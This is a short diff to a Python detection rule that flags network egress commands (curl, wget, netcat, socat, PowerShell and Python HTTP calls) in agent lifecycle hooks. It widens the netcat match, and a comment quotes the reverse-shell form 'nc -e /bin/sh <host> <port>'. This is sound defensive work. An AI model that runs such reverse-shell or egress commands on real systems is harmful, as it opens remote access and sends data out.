@@ -37,11 +37,18 @@ logger = logging.getLogger(__name__)
 # HOOK-001: network egress commands/URLs inside hook command strings.
 # Matches curl, wget, nc/ncat (netcat), socat, Python urllib/requests one-liners,
 # PowerShell Invoke-WebRequest, and raw http(s):// URLs.
+#
+# The ``nc`` clause matches any netcat invocation that carries an argument
+# (``\bnc\s+\S``).  An earlier ``(?!-[a-z])`` look-ahead was removed because it
+# silently excluded the most dangerous form — the ``nc -e /bin/sh <host> <port>``
+# reverse shell — while still matching benign-looking host-form invocations.
+# In an agent lifecycle hook there is no legitimate use of netcat, so matching
+# every ``nc <arg>`` form closes that false-negative without adding noise.
 _HOOK_NETWORK_RE: re.Pattern[str] = re.compile(
     r"(?i)\b(curl|wget|ncat|socat|Invoke-WebRequest|Invoke-RestMethod)\b"
     r"|https?://[^\s\)\"\']{8,}"
     r"|\bpython\b.{0,60}\b(urllib|requests|http\.client)\b"
-    r"|\bnc\s+(?!-[a-z])[^\s]",
+    r"|\bnc\s+\S",
     re.IGNORECASE,
 )
 
